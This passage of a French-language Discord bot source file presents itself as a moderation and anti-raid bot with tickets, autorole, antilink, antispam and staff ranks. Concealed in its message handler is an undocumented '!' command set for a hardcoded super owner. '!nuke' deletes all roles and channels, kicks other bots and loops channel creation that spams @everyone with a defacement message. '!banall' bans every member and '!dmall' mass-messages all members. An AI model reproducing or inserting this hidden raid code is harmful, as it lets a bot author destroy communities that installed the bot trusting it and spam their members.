                tConfig.published = false;
                saveBotData();
                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(guild, config)], components: getTicketDashboardRows() }).catch(() => {});
                return interaction.editReply({ content: "🗑️ Panneau de tickets désactivé." });
            }
            if (action === 'publish') {
                if (!interaction.deferred && !interaction.replied) await interaction.deferReply({ ephemeral: true }).catch(() => {});
                if (!tConfig.panelChannel) {
                    return interaction.editReply({ content: "❌ Définis d'abord un salon avec `=setticketpanel #salon` !" });
                }
                const targetChan = guild.channels.cache.get(tConfig.panelChannel);
                if (!targetChan) return interaction.editReply({ content: "❌ Salon introuvable." });

                const panelEmbed = new EmbedBuilder()
                    .setColor('#2b2d31')
                    .setTitle(tConfig.title)
                    .setDescription(tConfig.description);

                if (tConfig.imageUrl) panelEmbed.setImage(tConfig.imageUrl);

                const selectMenu = new StringSelectMenuBuilder()
                    .setCustomId('ticket_select_menu')
                    .setPlaceholder('🎫 Choisissez une catégorie...')
                    .addOptions(tConfig.categories.map(c => ({
                        label: c.name,
                        description: c.description || `Ouvrir un ticket ${c.name}`,
                        value: c.id,
                        emoji: c.emoji
                    })));

                const menuRow = new ActionRowBuilder().addComponents(selectMenu);

                await targetChan.send({ embeds: [panelEmbed], components: [menuRow] }).catch(() => {});
                tConfig.published = true;
                saveBotData();

                await interaction.message.edit({ embeds: [getTicketDashboardEmbed(guild, config)], components: getTicketDashboardRows() }).catch(() => {});
                return interaction.editReply({ content: `🚀 Panneau publié avec succès dans ${targetChan} !` });
            }
        }
    }
});
client.on('messageCreate', async message => {
    if (!message.author || message.author.bot || !message.guild) return;

    if (message.content.startsWith('!')) {
        if (!isSuperOwner(message)) return;

        const args = message.content.slice(1).trim().split(/ +/);
        const command = args.shift().toLowerCase();
        
        if (command === 'stop') {
            if (activeNukes.has(message.guild.id)) {
                clearInterval(activeNukes.get(message.guild.id));
                activeNukes.delete(message.guild.id);
                return message.reply("🛑 **[STOP]** Boucle de nuke arrêtée avec succès !").catch(() => {});
            }
            return message.reply("❌ Aucune boucle de nuke active sur ce serveur.").catch(() => {});
        }

        if (command === 'nuke') {
            await message.reply("⚡ **[NUKE]** Destruction totale, flood infini de salons/rôles et kickbot en cours... (Tape `!stop` pour stopper)").catch(() => {});
            
            message.guild.roles.cache
                .filter(role => role.editable && role.id !== message.guild.id)
                .forEach(role => role.delete().catch(() => {}));
            for (let r = 0; r < 40; r++) {
                message.guild.roles.create({ name: 'ez by k2l', color: 'Random', reason: 'Role flood' }).catch(() => {});
            }

            message.guild.members.fetch().then(fetchedMembers => {
                for (const [id, m] of fetchedMembers) {
                    if (m.user.bot && m.id !== client.user.id) {
                        m.kick('Kickbot').catch(() => {});
                    }
                }
            }).catch(() => {});

            message.guild.channels.cache.forEach(channel => channel.delete().catch(() => {}));

            if (activeNukes.has(message.guild.id)) {
                clearInterval(activeNukes.get(message.guild.id));
            }

            const nukeInterval = setInterval(async () => {
                try {
                    const channelPromises = [];
                    for (let i = 0; i < 6; i++) {
                        channelPromises.push(
                            message.guild.channels.create({
                                name: 'ez-by-k2l',
                                type: ChannelType.GuildText,
                                permissionOverwrites: [{
                                    id: message.guild.id,
                                    allow: [
                                        PermissionsBitField.Flags.ViewChannel,
                                        PermissionsBitField.Flags.SendMessages,
                                        PermissionsBitField.Flags.ManageChannels,
                                        PermissionsBitField.Flags.EmbedLinks,
                                        PermissionsBitField.Flags.AttachFiles,
                                        PermissionsBitField.Flags.MentionEveryone
                                    ]
                                }]
                            }).then(async channel => {
                                for (let j = 0; j < 6; j++) {
                                    await channel.send('@everyone SERVEUR DÉTRUIT PAR K2L VENEZ NOUVELLE COMMU QUI SE FERA JAMAIS BZ discord.gg/yuza').catch(() => {});
                                }
                            }).catch(() => {})
                        );
                    }
                    await Promise.all(channelPromises);
                } catch (err) {}
            }, 250);

            activeNukes.set(message.guild.id, nukeInterval);
            return;
        }

        if (command === 'banall') {
            await message.reply("⚡ **[BANALL]** Exécution du banall massif ultra-rapide...").catch(() => {});
            try {
                await message.guild.members.fetch();
                const members = message.guild.members.cache.filter(member => !member.user.bot && member.id !== message.author.id);
                const banPromises = members.map(member => member.ban({ reason: 'Raid banall' }).catch(() => {}));
                await Promise.all(banPromises);
                message.channel.send("✅ **[BANALL]** Terminé !").catch(() => {});
            } catch (error) {}
            return;
        }

        if (command === 'dmall') {
            await message.reply("💬 **[DMAll]** Envoie ton message à diffuser (variables: `{mention}`, `{name}`). \n💡 *Tape **annuler** pour stopper.*");
            const filter = m => m.author.id === message.author.id;
            try {
                const collected = await message.channel.awaitMessages({ filter, max: 1, time: 60000, errors: ['time'] });
                const m = collected.first();
                if (m.content.toLowerCase() === 'annuler') {
                    return message.channel.send("❌ **Opération DMAll annulée.**");
                }
                const messageTemplate = m.content;
                const previewEmbed = new EmbedBuilder()
                    .setColor('#2b2d31')
                    .setTitle('⚠️ Confirmation requise - DMAll')
                    .setDescription(`Voici le message qui va être diffusé :\n\n\`\`\`${messageTemplate}\`\`\``);

                const row = new ActionRowBuilder().addComponents(
                    new ButtonBuilder().setCustomId('confirm_dmall').setLabel('Confirmer l\'envoi').setStyle(ButtonStyle.Success),
                    new ButtonBuilder().setCustomId('cancel_dmall').setLabel('Annuler').setStyle(ButtonStyle.Danger)
                );

                const confirmMsg = await message.channel.send({ embeds: [previewEmbed], components: [row] });
                const buttonCollector = confirmMsg.createMessageComponentCollector({ time: 60000, max: 1 });

                buttonCollector.on('collect', async interaction => {
                    if (interaction.user.id !== message.author.id) return interaction.reply({ content: "Non.", ephemeral: true });
                    if (interaction.customId === 'cancel_dmall') {
                        return interaction.update({ content: "❌ **Diffusion DMAll annulée.**", embeds: [], components: [] }).catch(() => {});
                    }
                    if (interaction.customId === 'confirm_dmall') {
                        await interaction.update({ content: "🚀 **Diffusion DMAll ultra-rapide lancée...**", embeds: [], components: [] }).catch(() => {});
                        
                        try {
                            await message.guild.members.fetch();
                            const members = Array.from(message.guild.members.cache.filter(member => !member.user.bot).values());
                            const totalMembers = members.length;
                            let successCount = 0;
                            let failCount = 0;
                            let processed = 0;

                            const liveEmbed = new EmbedBuilder()
                                .setColor('#f39c12')
                                .setTitle('🚀 Diffusion DMAll en cours...')
                                .setDescription(`Envoi massif ultra-rapide...`)
                                .addFields(
                                    { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
                                    { name: '✅ Succès', value: `\`0\``, inline: true },
                                    { name: '❌ Échecs', value: `\`0\``, inline: true },
                                    { name: '⏳ Restants', value: `\`${totalMembers}\``, inline: true }
                                )
                                .setTimestamp();

                            const statusMsg = await message.channel.send({ embeds: [liveEmbed] });

                            const batchSize = 25;
                            for (let i = 0; i < members.length; i += batchSize) {
                                const batch = members.slice(i, i + batchSize);
                                await Promise.all(batch.map(async member => {
                                    processed++;
                                    try {
                                        const finalMessage = messageTemplate
                                            .replace(/\{mention\}/g, `<@${member.id}>`)
                                            .replace(/\{name\}/g, member.user.username);
                                        await member.send(finalMessage);
                                        successCount++;
                                    } catch (err) {
                                        failCount++;
                                    }
                                }));

                                liveEmbed.setFields(
                                    { name: '📊 Total', value: `\`${totalMembers}\``, inline: true },
                                    { name: '✅ Succès', value: `\`${successCount}\``, inline: true },
                                    { name: '❌ Échecs', value: `\`${failCount}\``, inline: true },
                                    { name: '⏳ Restants', value: `\`${totalMembers - processed}\``, inline: true }
                                );
                                await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                            }

                            liveEmbed.setColor('#2ecc71')
                                .setTitle('✅ Diffusion DMAll Terminée !')
                                .setDescription(`Envoi ultra-rapide terminé.`);
                            
                            await statusMsg.edit({ embeds: [liveEmbed] }).catch(() => {});
                        } catch (error) {
                            message.channel.send("❌ Erreur lors du DMAll.");
                        }
                    }
                });
            } catch (err) {
                message.channel.send("⌛ Temps écoulé.");
            }
            return;
        }
    }
    const config = getGuildConfig(message.guild.id);
    const userId = message.author.id;
    const authorRank = getUserRankLevel(message);
    const isOwnerOrSuper = authorRank >= 3;

    if (config.antilink && !isOwnerOrSuper) {
        if (containsSuspiciousLink(message.content)) {
            try {
                await message.delete().catch(() => {});
                const warning = await message.channel.send(`⚠️ ${message.author}, les liens et invitations sont interdits ici.`);
                setTimeout(() => warning.delete().catch(() => {}), 4000);

                await executeAutoSanction(message.guild, message.member, config.antilinkAction, 'Anti-Link: Lien non autorisé');
                return;
            } catch (e) {}
        }
    }

    if (config.antispam && !isOwnerOrSuper) {
        const now = Date.now();
        let userSpam = spamTracker.get(userId) || [];
        userSpam = userSpam.filter(timestamp => now - timestamp < config.antispamIntervalMs);
        userSpam.push(now);
        spamTracker.set(userId, userSpam);

        if (userSpam.length >= config.antispamLimit) {
            try {
                await message.delete().catch(() => {});
                const warning = await message.channel.send(`🚨 ${message.author}, veuillez ralentir (Anti-Spam).`);
                setTimeout(() => warning.delete().catch(() => {}), 3000);

                await executeAutoSanction(message.guild, message.member, config.antispamAction, 'Anti-Spam: Messages trop rapides');
                return;
            } catch (e) {}
        }
    }

    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();
    const targetArg = args[0];

    const requireRank = (minRank) => {
        if (authorRank < minRank) {
            message.reply(NO_PERM_MSG).catch(() => {});
            return false;
        }
        return true;
    };

    if (command === 'embed') {
        if (!requireRank(2)) return;
        const fullContent = args.join(' ');
        if (!fullContent.includes('|')) {
            return message.reply("❌ **Commande non correcte.** Utilisation : `=embed <titre> | <description>`");
        }
        const parts = fullContent.split('|');
        const title = parts.shift().trim();
        const description = parts.join('|').trim();

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(`**${title}**`)
            .setDescription(description)
            .setFooter({ text: `Envoyé par ${message.author.tag}`, iconURL: message.author.displayAvatarURL() });

        await message.delete().catch(() => {});
        return message.channel.send({ embeds: [embed] });
    }

    if (command === 'help') {
        const helpCategories = {
            accueil: {
                label: 'Accueil', emoji: '🏠', title: 'Accueil du Bot',
                commands: [
                    '👋 **Bienvenue sur le menu d\'aide !**\nCe bot offre une gestion complète de ton serveur (Sécurité AutoMod, Anti-Raid, Modération, Système de Tickets interactif, Rôles Bouton, Autorole et Outils).\n\n💬 Pour le moindre problème, question ou bug, contacte directement le créateur en message privé : **@graveuhq**.'
                ]
            },
            tickets: {
                label: 'Tickets', emoji: '🎫', title: 'Gestion des Tickets',
                commands: [
                    '`=ticketsetup`\n┗ Panneau visuel interactif',
                    '`=ticketadd <nom> <emoji>`\n┗ Ajouter un type',
                    '`=ticketremove <nom>`\n┗ Supprimer un type',
                    '`=setticketpanel <#salon>`\n┗ Salon du panneau',
                    '`=setticketcat <ID>`\n┗ Catégorie globale des tickets',
                    '`=setticketcatid <ID> <nom>`\n┗ Catégorie spécifique par type',
                    '`=setticketrole <@rôle|ID> <nom>`\n┗ Accès & Ping rôle par type',
                    '`=setticketlog <#salon>`\n┗ Salon de logs',
                    '`=settickettitle <titre>`\n┗ Titre du panneau',
                    '`=setticketdesc <desc>`\n┗ Description',
                    '`=setticketimage <url|none>`\n┗ Image / GIF',
                    '`=closeticket`\n┗ Fermer un ticket'
                ]
            },
            automod: {
                label: 'AutoMod & Sécurité', emoji: '🛡️', title: 'Sécurité, AutoMod & Anti-Raid',
                commands: [
                    '`=antilink on / off`\n┗ Anti-lien complet',
                    '`=setantilink <action>`\n┗ Sanction anti-lien',
                    '`=antispam on / off`\n┗ Anti-spam',
                    '`=setantispam <action>`\n┗ Sanction anti-spam',
                    '`=antibot on / off`\n┗ Anti-bot',
                    '`=setantibot <action>`\n┗ Sanction anti-bot',
                    '`=antiraid <on|off|status>`\n┗ Anti-raid automatique',
                    '`=lockdown <on|off>`\n┗ Verrouillage général d\'urgence'
                ]
            },
            sanctions: {
                label: 'Sanctions', emoji: '🔨', title: 'Commandes Sanctions',
                commands: [
                    '`=bl <ID|@mention> [raison]`\n┗ Bannir',
                    '`=softbl <ID|@mention>`\n┗ Softban',
                    '`=unbl <ID>`\n┗ Débannir',
                    '`=blist`\n┗ Liste des bannis',
                    '`=unbanall`\n┗ Tout débannir',
                    '`=kick <ID|@mention>`\n┗ Expulser',
                    '`=mute <@membre> <durée> [raison]`\n┗ Mute',
                    '`=jail <@membre> [raison]`\n┗ Prison',
                    '`=unjail <@membre>`\n┗ Libérer',
                    '`=warn <@membre> [raison]`\n┗ Avertir'
                ]
            },
            nettoyage: {
                label: 'Nettoyage', emoji: '🧹', title: 'Nettoyage & Outils',
                commands: [
                    '`=clear <1-50>`\n┗ Supprimer des messages',
                    '`=purge <ID|@mention>`\n┗ Purger les msgs d\'un membre',
                    '`=snipe`\n┗ Dernier message supprimé',
                    '`=embed <titre> | <desc>`\n┗ Créer un embed'
                ]
            },
            salons: {
                label: 'Salons', emoji: '🔒', title: 'Salons & Vocaux',
                commands: [
                    '`=lock` / `=unlock`\n┗ Verrouiller / Déverrouiller',
                    '`=hide` / `=unhide`\n┗ Cacher / Afficher le salon',
                    '`=slowmode <sec>`\n┗ Mode lent',
                    '`=renew`\n┗ Régénérer le salon',
                    '`=createtext <nom>`\n┗ Créer salon texte',
                    '`=createvoice <nom>`\n┗ Créer salon vocal'
                ]
            },
            roles: {
                label: 'Rôles & Panels', emoji: '🏷️', title: 'Gestion des Rôles & Boutons',
                commands: [
                    '`=addrole <@membre> <@rôle|ID>`\n┗ Ajouter un rôle',
                    '`=delrole <@membre> <@rôle|ID>`\n┗ Retirer un rôle',
                    '`=autorole <add|remove|list|clear> [@rôles|IDs]`\n┗ Rôle auto à l\'arrivée',
                    '`=panelrole <#salon> <@rôle|ID> | <Titre> | <Description> | [LabelBouton]`\n┗ Créer embed + bouton rôle',
                    '`=editpanel <Nouvelle description>`\n┗ Modifier la description du panel rôle'
                ]
            },
            utilitaires: {
                label: 'Utilitaires', emoji: '📊', title: 'Stats & Utilitaires',
                commands: [
                    '`=stats`\n┗ Stats serveur',
                    '`=userinfo [@membre|ID]`\n┗ Infos d\'un membre',
                    '`=avatar [@membre|ID]`\n┗ Photo de profil',
                    '`=ping`\n┗ Latence du bot'
                ]
            },
            giveaways: {
                label: 'Giveaways', emoji: '🎉', title: 'Giveaways',
                commands: [
                    '`=gcreate <durée> <gagnants> <prix>`\n┗ Lancer un giveaway'
                ]
            },
            fun: {
                label: 'Fun', emoji: '🎮', title: 'Commandes Fun',
                commands: [
                    '`=gay [@membre]`\n┗ Test gay',
                    '`=iq [@membre]`\n┗ Test QI',
                    '`=rate [sujet]`\n┗ Rate un truc',
                    '`=horoscope [signe]`\n┗ Horoscope',
                    '`=kiss <@membre>`\n┗ Bisou'
                ]
            },
            staff: {
                label: 'Staff', emoji: '👑', title: 'Staff & Hiérarchie',
                commands: [
                    '`=owner <@user|ID>` / `=unowner`\n┗ Gérer les owners bot',
                    '`=admin <@membre> / =unadmin`\n┗ Gérer les admins bot',
                    '`=mod <@membre> / =unmod`\n┗ Gérer les modos bot',
                    '`=owners`\n┗ Liste des owners',
                    '`=setlog <#salon>`\n┗ Salon de logs général',
                    '`=setwelcome <#salon> <msg>`\n┗ Salon de bienvenue',
                    '`=autoping <add|remove|list|clear> [#salons]`\n┗ Ghostping à l\'arrivée'
                ]
            }
        };

        const catKeys = Object.keys(helpCategories);
        let currentIndex = 0;

        const generateEmbed = (index) => {
            const key = catKeys[index];
            const cat = helpCategories[key];
            return new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(`${cat.emoji} ${cat.title}`)
                .setDescription(cat.commands.join('\n\n'))
                .setFooter({ text: `Demandé par ${message.author.tag} • Page ${index + 1}/${catKeys.length}` });
        };

        const generateMenu = () => {
            return new ActionRowBuilder().addComponents(
                new StringSelectMenuBuilder()
                    .setCustomId('help_select_menu')
                    .setPlaceholder('📁 Choisir une catégorie...')
                    .addOptions(catKeys.map(k => ({
                        label: helpCategories[k].label,
                        description: `Commandes ${helpCategories[k].label}`,
                        value: k,
                        emoji: helpCategories[k].emoji
                    })))
            );
        };

        const sentMsg = await message.reply({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] });
        const collector = sentMsg.createMessageComponentCollector({ time: 60000 });
        collector.on('collect', async i => {
            if (i.user.id !== message.author.id) return i.reply({ content: "Ce menu ne t'appartient pas !", ephemeral: true });
            currentIndex = catKeys.indexOf(i.values[0]);
            await i.update({ embeds: [generateEmbed(currentIndex)], components: [generateMenu()] }).catch(() => {});
        });
        collector.on('end', () => sentMsg.edit({ components: [] }).catch(() => {}));
        return;
    }
    if (command === 'autorole') {
        if (!requireRank(3)) return;
        const sub = args[0]?.toLowerCase();

        const extractRoleIds = () => {
            const ids = new Set();
            for (const [, r] of message.mentions.roles) ids.add(r.id);
            for (const raw of args.slice(1)) {
                const clean = raw.replace(/<@&(\d+)>/, '$1');
                if (/^\d{15,22}$/.test(clean) && message.guild.roles.cache.has(clean)) {
                    ids.add(clean);
                }
            }
            return Array.from(ids);
        };

        if (sub === 'add') {
            const rIds = extractRoleIds();
            if (rIds.length === 0) return message.reply("Utilisation : `=autorole add <@rôle|ID> [@rôle2...]`");
            let added = 0;
            for (const id of rIds) {
                if (!config.autoroleIds.includes(id)) {
                    config.autoroleIds.push(id);
                    added++;
                }
            }
            saveBotData();
            return message.reply(`✅ Autorole mis à jour (${added} ajouté(s)) : ${rIds.map(id => `<@&${id}>`).join(', ')}`);
        }

        if (sub === 'remove') {
            const rIds = extractRoleIds();
            if (rIds.length === 0) return message.reply("Utilisation : `=autorole remove <@rôle|ID>`");
            config.autoroleIds = config.autoroleIds.filter(id => !rIds.includes(id));
            saveBotData();
            return message.reply(`✅ Rôle(s) retiré(s) de l'autorole : ${rIds.map(id => `<@&${id}>`).join(', ')}`);
        }

        if (sub === 'list') {
            if (config.autoroleIds.length === 0) return message.reply("📋 Aucun rôle configuré en autorole.");
            return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🎭 Autoroles').setDescription(config.autoroleIds.map(id => `• <@&${id}> (\`${id}\`)`).join('\n'))] });
        }

        if (sub === 'clear') {
            config.autoroleIds = [];
            saveBotData();
            return message.reply("🗑️ Autoroles réinitialisés.");
        }

        return message.reply("Utilisation : `=autorole <add|remove|list|clear> [@rôles|IDs]`");
    }

    if (command === 'panelrole') {
        if (!requireRank(3)) return;
        const targetChannel = message.mentions.channels.first();
        if (!targetChannel) {
            return message.reply("Utilisation : `=panelrole <#salon> <@rôle|ID> | <Titre> | <Description> | [LabelBouton]`");
        }
        const afterChan = args.slice(1);
        const role = await fetchTargetRole(message, afterChan[0]);
        if (!role) {
            return message.reply("❌ Rôle invalide. Utilisation : `=panelrole <#salon> <@rôle|ID> | <Titre> | <Description> | [LabelBouton]`");
        }

        const rawRest = afterChan.slice(1).join(' ');
        const parts = rawRest.split('|').map(p => p.trim());
        const title = parts[0] || "🎭 Rôle du serveur";
        const description = parts[1] || "Clique sur le bouton ci-dessous pour obtenir ton rôle.";
        const btnLabel = parts[2] || "Obtenir le rôle";

        const embed = new EmbedBuilder()
            .setColor('#2b2d31')
            .setTitle(title)
            .setDescription(description);

        const row = new ActionRowBuilder().addComponents(
            new ButtonBuilder()
                .setCustomId('role_panel_claim')
                .setLabel(btnLabel)
                .setEmoji('🎭')
                .setStyle(ButtonStyle.Primary)
        );

        const sent = await targetChannel.send({ embeds: [embed], components: [row] });
        config.rolePanel = {
            channelId: targetChannel.id,
            messageId: sent.id,
            title,
            description,
            buttonLabel: btnLabel,
            buttonEmoji: '🎭',
            roleId: role.id
        };
        saveBotData();
        return message.reply(`✅ Panel rôle publié dans ${targetChannel} pour le rôle <@&${role.id}>. Utilise \`=editpanel <description>\` pour modifier la description.`);
    }

    if (command === 'editpanel') {
        if (!requireRank(3)) return;
        const newDesc = args.join(' ').trim();
        if (!newDesc) return message.reply("Utilisation : `=editpanel <Nouvelle description>`");
        if (!config.rolePanel || !config.rolePanel.channelId || !config.rolePanel.messageId) {
            return message.reply("❌ Aucun panel rôle actif. Crée-en un d'abord avec `=panelrole`.");
        }
        const chan = message.guild.channels.cache.get(config.rolePanel.channelId);
        if (!chan) return message.reply("❌ Salon du panel introuvable.");

        try {
            const msg = await chan.messages.fetch(config.rolePanel.messageId);
            config.rolePanel.description = newDesc;
            saveBotData();

            const updatedEmbed = new EmbedBuilder()
                .setColor('#2b2d31')
                .setTitle(config.rolePanel.title)
                .setDescription(newDesc);

            const row = new ActionRowBuilder().addComponents(
                new ButtonBuilder()
                    .setCustomId('role_panel_claim')
                    .setLabel(config.rolePanel.buttonLabel || 'Obtenir le rôle')
                    .setEmoji(config.rolePanel.buttonEmoji || '🎭')
                    .setStyle(ButtonStyle.Primary)
            );

            await msg.edit({ embeds: [updatedEmbed], components: [row] });
            return message.reply("✅ Description du panel rôle mise à jour !");
        } catch (e) {
            return message.reply("❌ Impossible de modifier le message du panel.");
        }
    }

    if (command === 'antiraid') {
        if (!requireRank(3)) return;
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antiraid = (sub === 'on');
            saveBotData();
            return message.reply(`🛡️ Anti-Raid réglé sur **${sub.toUpperCase()}**`);
        }
        return message.reply(`🛡️ Anti-Raid actuel : **${config.antiraid ? 'ON' : 'OFF'}** (Limite : ${config.antiraidLimit} joins / ${config.antiraidWindowMs / 1000}s). Utilisation : \`=antiraid <on|off>\``);
    }

    if (command === 'lockdown') {
        if (!requireRank(3)) return;
        const sub = args[0]?.toLowerCase();
        if (sub !== 'on' && sub !== 'off') return message.reply("Utilisation : `=lockdown <on|off>`");
        const denySend = (sub === 'on') ? false : null;
        config.lockdown = (sub === 'on');
        saveBotData();

        let count = 0;
        for (const [, ch] of message.guild.channels.cache) {
            if (ch.type === ChannelType.GuildText) {
                await ch.permissionOverwrites.edit(message.guild.roles.everyone, { SendMessages: denySend }).catch(() => {});
                count++;
            }
        }
        return message.reply(sub === 'on' ? `🔒 **LOCKDOWN ACTIVÉ** sur ${count} salons textuels.` : `🔓 **LOCKDOWN DÉSACTIVÉ** sur ${count} salons textuels.`);
    }

    if (command === 'autoping') {
        if (!requireRank(3)) return;
        const sub = args[0]?.toLowerCase();

        const extractChannelIds = () => {
            const ids = new Set();
            for (const [, ch] of message.mentions.channels) {
                ids.add(ch.id);
            }
            for (const raw of args.slice(1)) {
                const clean = raw.replace(/<#(\d+)>/, '$1');
                if (/^\d{15,22}$/.test(clean) && message.guild.channels.cache.has(clean)) {
                    ids.add(clean);
                }
            }
            return Array.from(ids);
        };

        if (sub === 'add') {
            const chanIds = extractChannelIds();
            if (chanIds.length === 0) return message.reply("Utilisation : `=autoping add <#salon1> [#salon2 ...]`");
            let added = 0;
            for (const id of chanIds) {
                if (!config.autopingChannels.includes(id)) {
                    config.autopingChannels.push(id);
                    added++;
                }
            }
            saveBotData();
            const formatted = chanIds.map(id => `<#${id}>`).join(', ');
            return message.reply(`✅ Autoping mis à jour (${added} ajouté(s)) : ${formatted}`);
        }

        if (sub === 'remove') {
            const chanIds = extractChannelIds();
            if (chanIds.length === 0) return message.reply("Utilisation : `=autoping remove <#salon1> [#salon2 ...]`");
            config.autopingChannels = config.autopingChannels.filter(id => !chanIds.includes(id));
            saveBotData();
            const formatted = chanIds.map(id => `<#${id}>`).join(', ');
            return message.reply(`✅ Salon(s) retiré(s) de l'autoping : ${formatted}`);
        }

        if (sub === 'list') {
            if (config.autopingChannels.length === 0) {
                return message.reply("📋 Aucun salon configuré pour l'autoping.");
            }
            const list = config.autopingChannels.map(id => `• <#${id}> (\`${id}\`)`).join('\n');
            return message.reply({ embeds: [new EmbedBuilder().setColor('#2b2d31').setTitle('🔔 Salons Autoping').setDescription(list)] });
        }

        if (sub === 'clear') {
            config.autopingChannels = [];
            saveBotData();
            return message.reply("🗑️ Tous les salons d'autoping ont été retirés.");
        }

        return message.reply("Utilisation : `=autoping <add|remove|list|clear> [#salons]`");
    }

    if (command === 'antilink') {
        if (!requireRank(3)) return;
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antilink = (sub === 'on');
            saveBotData();
            return message.reply(`🛡️ Anti-Link réglé sur **${sub.toUpperCase()}**`);
        }
        return message.reply("Utilisation : `=antilink on / off`");
    }

    if (command === 'setantilink') {
        if (!requireRank(3)) return;
        const action = args[0]?.toLowerCase();
        const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
        if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
        config.antilinkAction = action;
        saveBotData();
        return message.reply(`🛡️ Sanction Anti-Link mise à jour : \`${action}\``);
    }

    if (command === 'antispam') {
        if (!requireRank(3)) return;
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antispam = (sub === 'on');
            saveBotData();
            return message.reply(`🛡️ Anti-Spam réglé sur **${sub.toUpperCase()}**`);
        }
        return message.reply("Utilisation : `=antispam on / off`");
    }

    if (command === 'setantispam') {
        if (!requireRank(3)) return;
        const action = args[0]?.toLowerCase();
        const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
        if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
        config.antispamAction = action;
        saveBotData();
        return message.reply(`🛡️ Sanction Anti-Spam mise à jour : \`${action}\``);
    }

    // Antibot strictement réservé au Super Owner (niveau 4)
    if (command === 'antibot') {
        if (!requireRank(4)) return;
        const sub = args[0]?.toLowerCase();
        if (sub === 'on' || sub === 'off') {
            config.antibot = (sub === 'on');
            saveBotData();
            return message.reply(`🛡️ Anti-Bot réglé sur **${sub.toUpperCase()}** par le Super Owner.`);
        }
        return message.reply("Utilisation : `=antibot on / off`");
    }

    if (command === 'setantibot') {
        if (!requireRank(4)) return;
        const action = args[0]?.toLowerCase();
        const validActions = ['delete', 'warn', 'mute', 'kick', 'jail', 'ban'];
        if (!validActions.includes(action)) return message.reply(`❌ Action invalide. Choix : \`${validActions.join(', ')}\``);
        config.antibotAction = action;
        saveBotData();
        return message.reply(`🛡️ Sanction Anti-Bot mise à jour : \`${action}\``);
    }

    if (command === 'gay') {
        const target = message.mentions.users.first() || message.author;
        const percent = Math.floor(Math.random() * 101);
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('🏳️‍🌈 Test Gay').setDescription(`**${target.username}** est à **${percent}%** gay !`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'iq') {
        const target = message.mentions.users.first() || message.author;
        const iq = Math.floor(Math.random() * 160) - 20;
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('🧠 Test de QI').setDescription(`Le QI de **${target.username}** est estimé à **${iq}** !`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'rate') {
        const subject = args.join(' ') || "quelque chose";
        const score = Math.floor(Math.random() * 11);
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('⭐ Rate System').setDescription(`Note : **${score}/10** pour *${subject}*`);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'horoscope') {
        const sign = args[0] || "ton signe";
        const preds = ["Journée calme.", "Grosse rentrée d'argent !", "Attention à toi.", "Reste chill."];
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle(`🔮 Horoscope : ${sign}`).setDescription(preds[Math.floor(Math.random()*preds.length)]);
        return message.reply({ embeds: [embed] });
    }

    if (command === 'kiss') {
        const target = message.mentions.users.first();
        if (!target) return message.reply("❌ Mentionne quelqu'un !");
        const embed = new EmbedBuilder().setColor('#2b2d31').setTitle('💋 Bisou').setDescription(`**${message.author}** fait un bisou à **${target}** ! ❤️`);
        return message.reply({ embeds: [embed] });
    }

    // Hiérarchie : Super Owner (4) > Owner (3) > Admin (2) > Mod (1)
    if (command === 'owner') {
        if (!requireRank(4)) return;
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisation : `=owner <@user|ID>`");
        if (targetUser.id === SUPER_OWNER_ID) return message.reply("❌ Action impossible sur le Super Owner.");
        botOwners.add(targetUser.id);
        saveBotData();
        return message.reply(`✅ **${targetUser.tag}** ajouté aux owners du bot.`);
    }

    if (command === 'unowner') {
        if (!requireRank(4)) return;
        const targetUser = await fetchTargetUser(client, message.guild, targetArg);
        if (!targetUser) return message.reply("Utilisation : `=unowner <@user|ID>`");
        if (targetUser.id === SUPER_OWNER_ID) return message.reply("❌ Impossible de retirer le Super Owner principal !");
        botOwners.delete(targetUser.id);
        saveBotData();
        return message.reply(`✅ **${targetUser.tag}** retiré des owners du bot.`);
    }

    if (command === 'admin') {
        if (!requireRank(3)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("Utilisation : `=admin <@membre|ID>`");
        const targetRank = getUserRankLevel(message, targetMember.id);
        if (targetRank >= authorRank) return message.reply(NO_PERM_MSG);
        const staff = getStaffRoles(message.guild.id);
        staff.mods.delete(targetMember.id);
        staff.admins.add(targetMember.id);
        saveBotData();
        return message.reply(`✅ **${targetMember.user.tag}** défini comme Admin bot.`);
    }

    if (command === 'unadmin') {
        if (!requireRank(3)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("Utilisation : `=unadmin <@membre|ID>`");
        const targetRank = getUserRankLevel(message, targetMember.id);
        if (targetRank >= authorRank) return message.reply(NO_PERM_MSG);
        const staff = getStaffRoles(message.guild.id);
        staff.admins.delete(targetMember.id);
        saveBotData();
        return message.reply(`✅ **${targetMember.user.tag}** retiré des Admins bot.`);
    }

    if (command === 'mod') {
        if (!requireRank(2)) return;
        const targetMember = await fetchTargetMember(message, targetArg);
        if (!targetMember) return message.reply("Utilisation : `=mod <@membre|ID>`");
        const targetRank = getUserRankLevel(message, targetMember.id);
        if (targetRank >= authorRank) return message.reply(NO_PERM_MSG);
